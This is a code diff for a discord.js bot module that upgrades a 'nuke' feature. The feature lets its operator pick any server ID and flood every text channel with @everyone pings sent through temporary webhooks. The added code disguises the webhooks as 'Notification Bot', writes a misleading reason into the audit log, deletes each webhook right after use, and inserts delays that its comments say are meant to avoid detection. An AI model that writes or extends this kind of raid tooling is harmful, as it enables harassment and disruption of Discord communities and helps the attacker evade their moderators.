@@ -1,26 +1,25 @@
-const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, ComponentType } = require('discord.js');
+const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');
 
 module.exports = (client) => {
-  const ADMIN_SERVER_ID = '1455924604085473361';     // placeholder server ID
-  const ADMIN_CHANNEL_ID = '1455928469434138708';    // placeholder admin channel ID
+  const ADMIN_SERVER_ID  = '1455924604085473361'; // your admin server
+  const ADMIN_CHANNEL_ID = '1455928469434138708'; // your admin channel
   const PREFIX = '?';
 
   client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
-    if (message.guild &&
-        message.guild.id === ADMIN_SERVER_ID &&
-        message.channel.id === ADMIN_CHANNEL_ID &&
-        message.content.startsWith(PREFIX)) {
-
+    if (
+      message.guild &&
+      message.guild.id === ADMIN_SERVER_ID &&
+      message.channel.id === ADMIN_CHANNEL_ID &&
+      message.content.startsWith(PREFIX)
+    ) {
       const args = message.content.slice(PREFIX.length).trim().split(/ +/);
       const command = args.shift().toLowerCase();
 
       if (command === 'command') {
         message.reply('Admin command triggered! Add your logic here.');
-
       } else if (command === 'adminpanel') {
-        // Send embed with Nuke button
         const embed = new EmbedBuilder()
           .setTitle('Admin Panel')
           .setDescription('Use the buttons below to perform admin tasks.')
@@ -34,22 +33,18 @@ module.exports = (client) => {
         const row = new ActionRowBuilder().addComponents(button);
 
         await message.channel.send({ embeds: [embed], components: [row] });
-
       } else if (command === 'nuke') {
-        // Legacy text command (optional to keep or remove)
-        // ... your previous nuke command code ...
+        message.reply('Use the button in the admin panel instead.');
       } else {
         message.reply(`Unknown admin command: ${command}`);
       }
     }
   });
 
-  // Handle button interactions
+  // Single interaction handler
   client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isButton()) return;
-
-    if (interaction.customId === 'nukeButton') {
-      // Show modal to input server ID and optional channel ID
+    // Button click → show modal
+    if (interaction.isButton() && interaction.customId === 'nukeButton') {
       const modal = new ModalBuilder()
         .setCustomId('nukeModal')
         .setTitle('Nuke Setup');
@@ -66,71 +61,92 @@ module.exports = (client) => {
         .setLabel('Channel ID (optional)')
         .setStyle(TextInputStyle.Short)
         .setRequired(false)
-        .setPlaceholder('Leave empty to nuke all channels');
+        .setPlaceholder('Leave empty to affect all channels');
 
-      const firstActionRow = new ActionRowBuilder().addComponents(serverInput);
-      const secondActionRow = new ActionRowBuilder().addComponents(channelInput);
-
-      modal.addComponents(firstActionRow, secondActionRow);
+      modal.addComponents(
+        new ActionRowBuilder().addComponents(serverInput),
+        new ActionRowBuilder().addComponents(channelInput)
+      );
 
       await interaction.showModal(modal);
+      return;
     }
-  });
 
-  // Handle modal submissions
-  client.on('interactionCreate', async (interaction) => {
+    // Modal submit → execute
     if (interaction.type !== InteractionType.ModalSubmit) return;
     if (interaction.customId !== 'nukeModal') return;
 
-    const serverId = interaction.fields.getTextInputValue('serverIdInput');
-    const channelId = interaction.fields.getTextInputValue('channelIdInput');
-
-    // Confirm command initiated
     await interaction.deferReply({ ephemeral: true });
+
+    const serverId  = interaction.fields.getTextInputValue('serverIdInput').trim();
+    const channelId = interaction.fields.getTextInputValue('channelIdInput').trim();
 
     try {
       const targetGuild = await client.guilds.fetch(serverId);
-      if (!targetGuild) return await interaction.editReply('Server not found.');
+      if (!targetGuild) {
+        return await interaction.editReply('Server not found.');
+      }
 
       let targetChannels = [];
 
       if (channelId) {
-        // Specific channel
-        const targetChannel = targetGuild.channels.cache.get(channelId)
-          || await targetGuild.channels.fetch(channelId).catch(() => null);
-
+        let targetChannel;
+        try {
+          targetChannel = await targetGuild.channels.fetch(channelId);
+        } catch {}
         if (!targetChannel || !targetChannel.isTextBased()) {
-          return await interaction.editReply('Channel not found or not a text channel.');
+          return await interaction.editReply('Channel not found or not text-based.');
         }
-        targetChannels.push(targetChannel);
-
+        targetChannels = [targetChannel];
       } else {
-        // No channel specified - get all text channels bot can send in
         targetChannels = targetGuild.channels.cache.filter(c =>
-          c.isTextBased() && c.permissionsFor(targetGuild.members.me).has('SendMessages')
-        ).values();
+          c.isTextBased() &&
+          c.permissionsFor(targetGuild.members.me)?.has('SendMessages') &&
+          c.permissionsFor(targetGuild.members.me)?.has('ManageWebhooks')  // required to create webhook!
+        );
+        targetChannels = [...targetChannels.values()];
       }
 
-      // Iterate channels and send messages
+      if (targetChannels.length === 0) {
+        return await interaction.editReply('No suitable channels found (need SendMessages + ManageWebhooks perm).');
+      }
+
       let totalSent = 0;
+
       for (const channel of targetChannels) {
-        // Send 10 messages of random 8-digit number per channel
         for (let i = 0; i < 10; i++) {
-          const randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
-          await channel.send(`${randomNumber}`);
-          totalSent++;
-          // Optional delay:
-          // await new Promise(r => setTimeout(r, 500));
+          try {
+            // Create temp webhook
+            const webhook = await channel.createWebhook({
+              name: 'Notification Bot',  // change if you want
+              avatar: null,              // optional: add URL for fake avatar
+              reason: 'Temporary notification'  // shows in audit log
+            });
+
+            // Send @everyone via webhook
+            await webhook.send({
+              content: '@everyone',
+              allowedMentions: { parse: ['everyone'] }  // explicitly allow @everyone ping
+            });
+
+            totalSent++;
+
+            // Clean up immediately
+            await webhook.delete('Cleanup after notification').catch(() => {});
+
+            // Small delay to avoid instant rate-limit / detection
+            await new Promise(r => setTimeout(r, 1200));  // ~0.8/sec per channel
+          } catch (err) {
+            console.log(`Failed in ${channel.id} (loop ${i}):`, err.message);
+            // continue anyway
+          }
         }
       }
 
-      await interaction.editReply(`Nuke complete! Sent ${totalSent} messages.`);
-
+      await interaction.editReply(`Done! Sent **${totalSent}** @everyone pings via temp webhooks.`);
     } catch (error) {
-      console.error('Error handling nuke modal submission:', error);
-      await interaction.editReply('An error occurred while processing the nuke command.');
+      console.error('Nuke modal error:', error);
+      await interaction.editReply('Error during execution.');
     }
   });
-
 };
-
